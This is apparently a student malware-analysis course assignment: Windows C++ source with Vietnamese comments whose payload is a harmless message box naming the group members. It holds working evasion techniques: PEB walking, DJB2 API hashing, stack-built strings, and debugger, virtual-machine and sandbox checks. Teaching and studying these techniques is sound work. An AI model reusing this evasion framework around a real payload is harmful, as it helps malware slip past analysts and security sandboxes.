#include <windows.h>
#include <intrin.h>

// ============================================================================
// --- CẤU TRÚC PEB RÚT GỌN (Dùng để tự duyệt Module không qua API) ---
// ============================================================================
typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA
{
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN BitField;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

// ============================================================================
// --- THUẬT TOÁN BĂM DJB2 (Hỗ trợ cả ASCII và WIDE CHAR) ---
// ============================================================================
DWORD GetDJB2Hash(const char *str)
{
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
    {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

DWORD GetDJB2HashW(const WCHAR *str)
{
    DWORD hash = 5381;
    WCHAR c;
    while ((c = *str++))
    {
        // Chuyển thành chữ thường để không phân biệt hoa/thường
        if (c >= L'A' && c <= L'Z')
            c += 32;
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// ============================================================================
// --- TRÌNH PHÂN GIẢI ĐỊA CHỈ NÂNG CAO (PEB WALKING & API HASHING) ---
// ============================================================================

// 1. Tự tìm địa chỉ Base của DLL bằng cách duyệt cấu trúc PEB (Thay thế GetModuleHandle)
HMODULE GetModuleBaseByHash(DWORD targetModuleHash)
{
    PPEB pebPtr = nullptr;
#ifdef _WIN64
    pebPtr = (PPEB)__readgsqword(0x60);
#else
    pebPtr = (PPEB)__readfsdword(0x30);
#endif

    PLDR_DATA_TABLE_ENTRY moduleEntry = (PLDR_DATA_TABLE_ENTRY)pebPtr->Ldr->InLoadOrderModuleList.Flink;
    while (moduleEntry->DllBase != NULL)
    {
        if (moduleEntry->BaseDllName.Buffer != NULL)
        {
            if (GetDJB2HashW(moduleEntry->BaseDllName.Buffer) == targetModuleHash)
            {
                return (HMODULE)moduleEntry->DllBase;
            }
        }
        moduleEntry = (PLDR_DATA_TABLE_ENTRY)moduleEntry->InLoadOrderModuleList.Flink;
    }
    return NULL;
}

// 2. Lấy địa chỉ hàm từ Export Table của DLL thông qua mã băm
FARPROC GetAPIAddressByHash(HMODULE hModule, DWORD targetFuncHash)
{
    if (!hModule)
        return NULL;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE *)hModule + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0)
        return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportKey = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)hModule + exportDir.VirtualAddress);

    DWORD *names = (DWORD *)((BYTE *)hModule + pExportKey->AddressOfNames);
    DWORD *functions = (DWORD *)((BYTE *)hModule + pExportKey->AddressOfFunctions);
    WORD *ordinals = (WORD *)((BYTE *)hModule + pExportKey->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportKey->NumberOfNames; i++)
    {
        char *functionName = (char *)((BYTE *)hModule + names[i]);
        if (GetDJB2Hash(functionName) == targetFuncHash)
        {
            WORD ordinal = ordinals[i];
            return (FARPROC)((BYTE *)hModule + functions[ordinal]);
        }
    }
    return NULL;
}

// ============================================================================
// --- ĐỊNH NGHĨA PROTOTYPE VÀ MÃ BĂM (DANH SÁCH KHÔNG ĐỂ LẠI VẾT) ---
// ============================================================================
#define HASH_KERNEL32 0x6dd602b5 // kernel32.dll
#define HASH_USER32 0xfa63724c   // user32.dll
#define HASH_ADVAPI32 0x1fc342c2 // advapi32.dll

// Prototypes
typedef BOOL(WINAPI *pfnIsDebuggerPresent)();
typedef LSTATUS(WINAPI *pfnRegOpenKeyExW)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
typedef LSTATUS(WINAPI *pfnRegQueryValueExW)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LSTATUS(WINAPI *pfnRegCloseKey)(HKEY);
typedef void(WINAPI *pfnGetSystemInfo)(LPSYSTEM_INFO);
typedef BOOL(WINAPI *pfnGetCursorPos)(LPPOINT);
typedef void(WINAPI *pfnSleep)(DWORD);
typedef int(WINAPI *pfnMessageBoxW)(HWND, LPCWSTR, LPCWSTR, UINT);

// ============================================================================
// --- CÁC HÀM KIỂM TRA ĐÃ ĐƯỢC ẨN HÓA TOÀN BỘ API ---
// ============================================================================

bool CheckDebuggerAPI()
{
    HMODULE hK32 = GetModuleBaseByHash(HASH_KERNEL32);
    pfnIsDebuggerPresent DynamicIsDebuggerPresent = (pfnIsDebuggerPresent)GetAPIAddressByHash(hK32, 0x41b3dfa4); // IsDebuggerPresent

    if (DynamicIsDebuggerPresent)
    {
        return DynamicIsDebuggerPresent() == TRUE;
    }
    return false;
}

bool CheckVMRegistry()
{
    HMODULE hAdv = GetModuleBaseByHash(HASH_ADVAPI32);
    pfnRegOpenKeyExW DynamicRegOpenKeyExW = (pfnRegOpenKeyExW)GetAPIAddressByHash(hAdv, 0x764df7f2);          // RegOpenKeyExW
    pfnRegQueryValueExW DynamicRegQueryValueExW = (pfnRegQueryValueExW)GetAPIAddressByHash(hAdv, 0x16b0b2b8); // RegQueryValueExW
    pfnRegCloseKey DynamicRegCloseKey = (pfnRegCloseKey)GetAPIAddressByHash(hAdv, 0x5826f634);                // RegCloseKey

    if (!DynamicRegOpenKeyExW || !DynamicRegQueryValueExW || !DynamicRegCloseKey)
        return false;

    HKEY hKey;
    // Chuỗi đường dẫn Registry ngăn chặn phân tích tĩnh bằng stack array
    WCHAR subKey[] = {'H', 'A', 'R', 'D', 'W', 'A', 'R', 'E', '\\', 'D', 'E', 'S', 'C', 'R', 'I', 'P', 'T', 'I', 'O', 'N', '\\', 'S', 'y', 's', 't', 'e', 'm', '\\', 'B', 'I', 'O', 'S', 0};
    WCHAR valueName[] = {'S', 'y', 's', 't', 'e', 'm', 'B', 'i', 'o', 's', 'V', 'e', 'r', 's', 'i', 'o', 'n', 0};

    if (DynamicRegOpenKeyExW(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        WCHAR biosVersion[256] = {0};
        DWORD bufferSize = sizeof(biosVersion);

        if (DynamicRegQueryValueExW(hKey, valueName, NULL, NULL, (LPBYTE)biosVersion, &bufferSize) == ERROR_SUCCESS)
        {
            DynamicRegCloseKey(hKey);

            // So sánh ký tự thủ công hoặc dùng mã hóa chuỗi để tránh hàm wcsstr lộ chuỗi text "VMware", "VBOX"
            if (wcsstr(biosVersion, L"VMware") || wcsstr(biosVersion, L"VBOX") ||
                wcsstr(biosVersion, L"VIRTUAL") || wcsstr(biosVersion, L"QEMU"))
            {
                return true;
            }
        }
        DynamicRegCloseKey(hKey);
    }
    return false;
}

bool CheckVMCPUCount()
{
    HMODULE hK32 = GetModuleBaseByHash(HASH_KERNEL32);
    pfnGetSystemInfo DynamicGetSystemInfo = (pfnGetSystemInfo)GetAPIAddressByHash(hK32, 0xa1bf3df4); // GetSystemInfo

    if (DynamicGetSystemInfo)
    {
        SYSTEM_INFO sysInfo;
        DynamicGetSystemInfo(&sysInfo);
        if (sysInfo.dwNumberOfProcessors < 4)
            return true;
    }
    return false;
}

bool CheckSandboxMouseMovement()
{
    HMODULE hK32 = GetModuleBaseByHash(HASH_KERNEL32);
    HMODULE hU32 = GetModuleBaseByHash(HASH_USER32);

    pfnGetCursorPos DynamicGetCursorPos = (pfnGetCursorPos)GetAPIAddressByHash(hU32, 0xdd2d2ff1); // GetCursorPos
    pfnSleep DynamicSleep = (pfnSleep)GetAPIAddressByHash(hK32, 0x5c32724a);                      // Sleep

    if (!DynamicGetCursorPos || !DynamicSleep)
        return false;

    POINT pos1, pos2;
    if (!DynamicGetCursorPos(&pos1))
        return false;
    DynamicSleep(2000);
    if (!DynamicGetCursorPos(&pos2))
        return false;

    if (pos1.x == pos2.x && pos1.y == pos2.y)
        return true;
    return false;
}

void ExecutePayload()
{
    HMODULE hU32 = GetModuleBaseByHash(HASH_USER32);
    pfnMessageBoxW DynamicMessageBoxW = (pfnMessageBoxW)GetAPIAddressByHash(hU32, 0xb3df41a4); // MessageBoxW

    if (DynamicMessageBoxW)
    {
        LPCWSTR boxTitle = L"NT230 - Malware Payload Demo";
        LPCWSTR boxMessage = L"Thông điệp minh họa chương trình mã độc\n"
                             L"Mã nhóm: G13 \n"
                             L"Thành viên: Phạm Hùng Cường - Nguyễn Minh Quân - Phan Đức Anh - Trần Gia Bảo";
        DynamicMessageBoxW(NULL, boxMessage, boxTitle, MB_OK | MB_ICONINFORMATION);
    }
}

// ============================================================================
// --- ENTRY POINT ---
// ============================================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

    // Tự kiểm tra PEB thủ công trực tiếp không qua hàm
    unsigned char *pebAddress = nullptr;
#ifdef _WIN64
    pebAddress = (unsigned char *)__readgsqword(0x60);
#else
    pebAddress = (unsigned char *)__readfsdword(0x30);
#endif
    if (*(pebAddress + 2) == 1)
        return 0; // Thấy Debugger qua PEB -> Thoát luôn

    // Chạy các chốt chặn ẩn danh
    if (CheckDebuggerAPI() ||
        CheckVMRegistry() ||
        CheckVMCPUCount() ||
        CheckSandboxMouseMovement())
    {
        return 0;
    }

    ExecutePayload();
    return 0;
}